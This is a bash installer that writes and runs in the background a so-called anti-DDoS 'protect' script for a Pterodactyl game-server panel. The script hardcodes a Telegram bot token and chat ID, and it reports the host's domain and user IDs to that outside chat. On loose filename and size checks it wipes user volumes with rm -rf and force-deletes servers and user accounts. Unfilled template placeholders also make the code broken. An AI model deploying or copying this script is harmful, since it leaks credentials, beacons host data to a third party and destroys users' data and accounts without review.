cat << 'EOF' > /usr/local/bin/ultra-protect.sh
#!/bin/bash

LOG="/var/log/anti-ddos.log"

# Auto install module
for pkg in jq curl bc docker; do
  command -v $pkg &> /dev/null || (apt update -y && apt install -y $pkg)
done

PTERO_API="https://${session.plta}/api/application/servers"
PTERO_USER_API="https://${session.domain}/api/application/users"
API_KEY="${session.plta}"

# ===== DOMAIN FROM NGINX =====
DOMAIN=$(grep -R "server_name" /etc/nginx/sites-enabled /etc/nginx/sites-available 2>/dev/null \
| grep -v "_" | head -n 1 | awk '{for(i=1;i<=NF;i++) if($i!="server_name") print $i}' | tr -d ';')

BOT_TOKEN="8073575429:AAF1IhaYQrOnndLZVqoQlDcx2Hv2uCjHiS4"
CHAT_ID="7595805220"

DISK_LIMIT=5368709120
DISK_EXTREME=107374182400
CPU_LIMIT=200
MEM_LIMIT=2048

# ====== TELEGRAM CLEAN MESSAGE ======
send() {
  TEXT="$1"

  curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
  -d "chat_id=$CHAT_ID" \
  -d "parse_mode=HTML" \
  -d "text=
<b>🛡 MONITOR PANEL</b>

<blockquote>🚨 ALERT DETECTED
$TEXT</blockquote>

<b>📊 SYSTEM STATUS</b>
• Mode   : Anti Kill Panel! 
• State  : Active
• Domain : $DOMAIN

<b>👤 OWNER</b>
Rexzzy Protect"
}

# ====== USER INFO ======
get_user_info() {
  USER_ID=$1
  UUID=$2
  echo "ID: <code>$USER_ID</code>
UUID: <code>$UUID</code>"
}

# ====== WIPE ======
wipe() {
  shopt -s dotglob
  rm -rf "$1"/*
  rm -rf "$1"/.[!.]* 2>/dev/null
  shopt -u dotglob
}

# ====== SERVER DELETE ======
del_server() {
  UUID=$1
  DATA=$(curl -s "$PTERO_API" -H "Authorization: Bearer $API_KEY")

  echo "$DATA" | jq -c '.data[]' | while read s; do
    ID=$(echo "$s" | jq '.attributes.id')
    U=$(echo "$s" | jq -r '.attributes.uuid')
    USER_ID=$(echo "$s" | jq '.attributes.user')

    if [ "$U" = "$UUID" ]; then
      send "$(get_user_info "$USER_ID" "$UUID")"

      curl -s -X POST "$PTERO_API/$ID/suspend" -H "Authorization: Bearer $API_KEY" > /dev/null
      curl -s -X DELETE "$PTERO_API/$ID?force=true" -H "Authorization: Bearer $API_KEY" > /dev/null
      curl -s -X DELETE "$PTERO_USER_API/$USER_ID" -H "Authorization: Bearer $API_KEY" > /dev/null
    fi
  done
}

nuke() {
  DIR=$1
  UUID=$(basename "$DIR")

  wipe "$DIR"
  del_server "$UUID"

  echo "[NUKE] $UUID" >> $LOG
}

# ====== FILE SCAN ======
scan_files() {
  for dir in /var/lib/pterodactyl/volumes/*; do
    [ -d "$dir" ] || continue
    UUID=$(basename "$dir")

    USER_ID=$(curl -s "$PTERO_API" | jq -r ".data[] | select(.attributes.uuid==\"$UUID\") | .attributes.user")
    INFO=$(get_user_info "$USER_ID" "$UUID")

    SIZE=$(du -sb "$dir" 2>/dev/null | awk '{print $1}')

    if [ "$SIZE" -gt "$DISK_EXTREME" ]; then
      send "DISK EXTREME (>100GB)
$INFO"
      nuke "$dir"
      continue
    fi

    if [ "$SIZE" -gt "$DISK_LIMIT" ]; then
      send "DISK OVERLOAD (>5GB)
$INFO"
      nuke "$dir"
      continue
    fi

    BAD_ZIP=$(find "$dir" -type f -iname "*.zip" 2>/dev/null | grep -Ei "kill|ddos|mokad|kil" | head -n 1)

    if [ -n "$BAD_ZIP" ]; then
      send "DANGEROUS ZIP DETECTED
FILE: $BAD_ZIP
$INFO"
      nuke "$dir"
      continue
    fi

    SCARRY=$(find "$dir" -type f -name "SCARRYDEATH.js" 2>/dev/null | head -n 1)

    if [ -n "$SCARRY" ]; then
      send "SCARRY FILE DETECTED
FILE: $SCARRY
$INFO"
      nuke "$dir"
      continue
    fi
  done
}

# ====== NETWORK SPAM ======
detect_panel_network_spam() {
  for dir in /var/lib/pterodactyl/volumes/*; do
    [ -d "$dir" ] || continue
    UUID=$(basename "$dir")

    CONTAINER=$(docker ps --format "{{.ID}} {{.Names}}" | grep "$UUID" | awk '{print $1}')
    [ -z "$CONTAINER" ] && continue

    CONN=$(docker exec "$CONTAINER" sh -c "ss -ntu 2>/dev/null | wc -l" 2>/dev/null)

    if [ "$CONN" -gt 500 ]; then
      send "NETWORK SPAM DETECTED
UUID: $UUID
Connections: $CONN"
    fi
  done
}

# ====== TOP IP ======
detect_top_ip_spam() {
  for dir in /var/lib/pterodactyl/volumes/*; do
    [ -d "$dir" ] || continue
    UUID=$(basename "$dir")

    CONTAINER=$(docker ps --format "{{.ID}} {{.Names}}" | grep "$UUID" | awk '{print $1}')
    [ -z "$CONTAINER" ] && continue

    docker exec "$CONTAINER" sh -c "
      ss -ntu 2>/dev/null | awk '{print \$5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head -n 5
    " 2>/dev/null
  done
}

# ====== PANEL RESOURCE ======
protect_panel() {
  DATA=$(curl -s "$PTERO_API" -H "Authorization: Bearer $API_KEY")

  echo "$DATA" | jq -c '.data[]' | while read s; do
    ID=$(echo "$s" | jq '.attributes.id')
    UUID=$(echo "$s" | jq -r '.attributes.uuid')
    USER_ID=$(echo "$s" | jq '.attributes.user')

    CPU=$(curl -s "$PTERO_API/$ID/resources" -H "Authorization: Bearer $API_KEY" | jq '.meta.current_state.cpu_absolute')
    MEM=$(curl -s "$PTERO_API/$ID/resources" -H "Authorization: Bearer $API_KEY" | jq '.meta.current_state.memory_bytes')

    MEM_MB=$(echo "$MEM / 1024 / 1024" | bc)

    if (( $(echo "$CPU > $CPU_LIMIT" | bc -l) )) || (( MEM_MB > $MEM_LIMIT )); then
      curl -s -X POST "$PTERO_API/$ID/suspend" -H "Authorization: Bearer $API_KEY" > /dev/null

      send "HIGH USAGE DETECTED
CPU: $CPU%
RAM: $MEM_MB MB
$(get_user_info "$USER_ID" "$UUID")"
    fi
  done
}

send "SYSTEM ONLINE
Network Protection Active
Domain: $DOMAIN"

while true; do
  scan_files
  protect_panel
  detect_panel_network_spam
  detect_top_ip_spam
  sleep 5
done
EOF

chmod +x /usr/local/bin/ultra-protect.sh
nohup /usr/local/bin/ultra-protect.sh > /dev/null 2>&1 &